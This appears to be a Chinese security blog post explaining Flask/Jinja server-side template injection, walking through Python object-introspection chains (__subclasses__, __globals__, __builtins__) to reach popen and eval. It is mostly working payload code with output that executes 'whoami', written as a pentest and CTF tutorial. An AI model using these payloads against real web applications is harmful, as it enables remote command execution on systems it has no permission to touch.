+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>Flask 模版注入（SSTI）</h1><div class=post-meta><time>2021-07-11</time>
+(update <time>2024-05-23</time>)
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/python>python</a>,<a href=/tags/ctf>ctf</a>,<a href=/tags/rce>rce</a>)</div><div><h3 id=0x00-ssti-模版注入>0x00 SSTI 模版注入</h3><p>SSTI 模版注入一般都是先找到执行命令的模块模块，然后执行（可以用工具 tplmap）</p><p>一般步骤：<br>1、某种类型 (字符串:""，list:[]，int：1) 开始引出<br>2、<code>__class__</code> 找到当前类<br>3、<code>__mro__</code> 或者 <code>__base__</code> 或者 <code>__bases__</code> 找到根类 <code>__object__</code><br>4、然后利用 <code>__subclasses__</code> 拿到子类列表<br>5、然后在子类列表 <code>__init__.__globals__.keys()</code> 找到类似 popen 能执行命令的函数</p><h3 id=0x01-python3-例子>0x01 python3 例子</h3><ul><li><p>当前类</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e># __class__ 返回对象所属类</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>str</span><span style=color:#e6db74>&#39;&gt;</span>
+</span></span></code></pre></div></li><li><p>获取 object 根类</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e># __mro__、__bases__ 都可以返回继承链关系</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__mro__
+</span></span><span style=display:flex><span>(<span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>str</span><span style=color:#e6db74>&#39;&gt;, &lt;class &#39;</span>object<span style=color:#e6db74>&#39;&gt;)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__
+</span></span><span style=display:flex><span>(<span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>object</span><span style=color:#e6db74>&#39;&gt;,)</span>
+</span></span></code></pre></div></li><li><p>获取子类列表</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#75715e># __subclasses__() 以列表返回类的所有子类</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__mro__[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>__subclasses__()
+</span></span><span style=display:flex><span>[<span style=color:#f92672>&lt;</span>type <span style=color:#e6db74>&#39;type&#39;</span><span style=color:#f92672>&gt;</span>,
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>type <span style=color:#e6db74>&#39;weakref&#39;</span><span style=color:#f92672>&gt;</span>,
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>type <span style=color:#e6db74>&#39;weakcallableproxy&#39;</span><span style=color:#f92672>&gt;</span>,
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>type <span style=color:#e6db74>&#39;super&#39;</span><span style=color:#f92672>&gt;</span>,
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>type <span style=color:#e6db74>&#39;dict&#39;</span><span style=color:#f92672>&gt;</span>,
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>type <span style=color:#e6db74>&#39;set&#39;</span><span style=color:#f92672>&gt;</span>,
+</span></span><span style=display:flex><span><span style=color:#f92672>......</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>......</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>site</span><span style=color:#f92672>.</span>_Printer<span style=color:#e6db74>&#39;&gt;,</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>site</span><span style=color:#f92672>.</span>_Helper<span style=color:#e6db74>&#39;&gt;,</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>site</span><span style=color:#f92672>.</span>Quitter<span style=color:#e6db74>&#39;&gt;,</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>codecs</span><span style=color:#f92672>.</span>IncrementalEncoder<span style=color:#e6db74>&#39;&gt;,</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>codecs</span><span style=color:#f92672>.</span>IncrementalDecoder<span style=color:#e6db74>&#39;&gt;]</span>
+</span></span></code></pre></div></li><li><p>通过 os.popen、os.system、subprocess.Popen 执行命令</p><p>找到存在 popen、system 等可以执行命令的类</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#66d9ef>for</span> i,v <span style=color:#f92672>in</span> enumerate(<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>__subclasses__()):
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>     <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>         <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;popen&#39;</span> <span style=color:#f92672>in</span> v<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>             print(i, v)
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>     <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>         <span style=color:#66d9ef>pass</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>154</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>os</span><span style=color:#f92672>.</span>_wrap_close<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#66d9ef>for</span> i,v <span style=color:#f92672>in</span> enumerate(<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>__subclasses__()):
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>     <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>         <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;Popen&#39;</span> <span style=color:#f92672>in</span> v<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>             print(i, v)
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>     <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>         <span style=color:#66d9ef>pass</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>250</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>subprocess</span><span style=color:#f92672>.</span>CompletedProcess<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>251</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>subprocess</span><span style=color:#f92672>.</span>Popen<span style=color:#e6db74>&#39;&gt;</span>
+</span></span></code></pre></div><p>通过 <code>__init__</code> 初始化类实例</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>__subclasses__()[<span style=color:#ae81ff>154</span>]<span style=color:#f92672>.</span>__init__
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span>function _wrap_close<span style=color:#f92672>.</span>__init__ at <span style=color:#ae81ff>0x1081df740</span><span style=color:#f92672>&gt;</span>
+</span></span></code></pre></div><p>通过 <code>__globals__</code> 拿到字典类型的内建模块，可以看到 popen</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__mro__[<span style=color:#ae81ff>2</span>]<span style=color:#f92672>.</span>__subclasses__()[<span style=color:#ae81ff>74</span>]<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__
+</span></span><span style=display:flex><span>{<span style=color:#e6db74>&#39;__name__&#39;</span>: <span style=color:#e6db74>&#39;os&#39;</span>, 
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;__doc__&#39;</span>: <span style=color:#e6db74>&#34;OS routines for...&#34;</span>, 
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;__package__&#39;</span>: <span style=color:#e6db74>&#39;&#39;</span>, 
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;__doc__&#39;</span>: <span style=color:#e6db74>&#34;Built-in function....&#34;</span>, 
+</span></span><span style=display:flex><span><span style=color:#f92672>......</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>......</span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;__all__&#39;</span>: [
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;spawnv&#39;</span>, 
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;spawnve&#39;</span>, 
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;spawnvp&#39;</span>, 
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;spawnvpe&#39;</span>, 
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;popen&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>......</span>
+</span></span><span style=display:flex><span>], 
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;fdopen&#39;</span>: <span style=color:#f92672>&lt;</span>function fdopen at <span style=color:#ae81ff>0x1081df6a0</span><span style=color:#f92672>&gt;</span>, 
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;_fspath&#39;</span>: <span style=color:#f92672>&lt;</span>function _fspath at <span style=color:#ae81ff>0x1081dfb00</span><span style=color:#f92672>&gt;</span>, 
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;PathLike&#39;</span>: <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>os</span><span style=color:#f92672>.</span>PathLike<span style=color:#e6db74>&#39;&gt;}</span>
+</span></span></code></pre></div><p>初始化后执行命令</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>__subclasses__()[<span style=color:#ae81ff>154</span>]<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;popen&#39;</span>](<span style=color:#e6db74>&#39;whoami&#39;</span>)<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;reber</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
+</span></span></code></pre></div></li><li><p>直接通过 os 模块执行命令</p><p>其实上面的例子用的是 os 模块</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#66d9ef>for</span> i,v <span style=color:#f92672>in</span> enumerate(<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>__subclasses__()):
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>     <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>         <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;os&#39;</span> <span style=color:#f92672>in</span> v<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>             print(i, v)
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>     <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>         <span style=color:#66d9ef>pass</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>158</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>_distutils_hack</span><span style=color:#f92672>.</span>_TrivialRe<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>232</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>contextlib</span><span style=color:#f92672>.</span>_GeneratorContextManagerBase<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>233</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>contextlib</span><span style=color:#f92672>.</span>_BaseExitStack<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>239</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>inspect</span><span style=color:#f92672>.</span>BlockFinder<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>242</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>inspect</span><span style=color:#f92672>.</span>Parameter<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>243</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>inspect</span><span style=color:#f92672>.</span>BoundArguments<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>244</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>inspect</span><span style=color:#f92672>.</span>Signature<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>250</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>subprocess</span><span style=color:#f92672>.</span>CompletedProcess<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>251</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>subprocess</span><span style=color:#f92672>.</span>Popen<span style=color:#e6db74>&#39;&gt;</span>
+</span></span></code></pre></div><p>执行命令</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>__subclasses__()[<span style=color:#ae81ff>158</span>]<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;os&#39;</span>]<span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;whoami&#39;</span>)<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;reber</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
+</span></span></code></pre></div><p>这种方法<f>不准确</f>，因为一些不相关的类名中也存在字符串 &ldquo;os&rdquo;</p></li><li><p>通过 <code>__builtins__</code> 执行命令</p><p><code>__builtins__</code> 下有 eval、<code>__import__</code> 等函数</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#66d9ef>for</span> i,v <span style=color:#f92672>in</span> enumerate(<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>__subclasses__()):
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>     <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>         <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;eval&#39;</span> <span style=color:#f92672>in</span> v<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;__builtins__&#39;</span>]:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>             print(i, v)
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>     <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>         <span style=color:#66d9ef>pass</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>140</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>codecs</span><span style=color:#f92672>.</span>IncrementalEncoder<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>141</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>codecs</span><span style=color:#f92672>.</span>IncrementalDecoder<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>142</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>codecs</span><span style=color:#f92672>.</span>StreamReaderWriter<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>143</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>codecs</span><span style=color:#f92672>.</span>StreamRecoder<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>154</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>os</span><span style=color:#f92672>.</span>_wrap_close<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>155</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>_sitebuiltins</span><span style=color:#f92672>.</span>Quitter<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>163</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>warnings</span><span style=color:#f92672>.</span>WarningMessage<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>164</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>warnings</span><span style=color:#f92672>.</span>catch_warnings<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>191</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>reprlib</span><span style=color:#f92672>.</span>Repr<span style=color:#e6db74>&#39;&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>201</span> <span style=color:#f92672>&lt;</span><span style=color:#66d9ef>class</span> <span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#a6e22e>functools</span><span style=color:#f92672>.</span>partialmethod<span style=color:#e6db74>&#39;&gt;</span>
+</span></span></code></pre></div><p>通过第 140 个的类执行命令</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>__subclasses__()[<span style=color:#ae81ff>140</span>]<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;__builtins__&#39;</span>][<span style=color:#e6db74>&#39;eval&#39;</span>](<span style=color:#e6db74>&#39;__import__(&#34;os&#34;).popen(&#34;whoami&#34;).read()&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;reber</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> ()<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span>__bases__[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>__subclasses__()[<span style=color:#ae81ff>140</span>]<span style=color:#f92672>.</span>__init__<span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;__builtins__&#39;</span>][<span style=color:#e6db74>&#39;__import__&#39;</span>](<span style=color:#e6db74>&#39;os&#39;</span>)<span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;whoami&#39;</span>)<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;reber</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
+</span></span></code></pre></div></li></ul><p><strong>Reference(侵删)：</strong></p><ul><li><a href=https://xz.aliyun.com/t/12163?_blank>Flask基础及模板注入漏洞（SSTI）</a></li><li><a href=https://www.cnblogs.com/chrysanthemum/p/12766783.html?_blank>SSTI的payload</a></li><li><a href=https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/?_blank>Python 沙盒逃逸备忘</a></li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
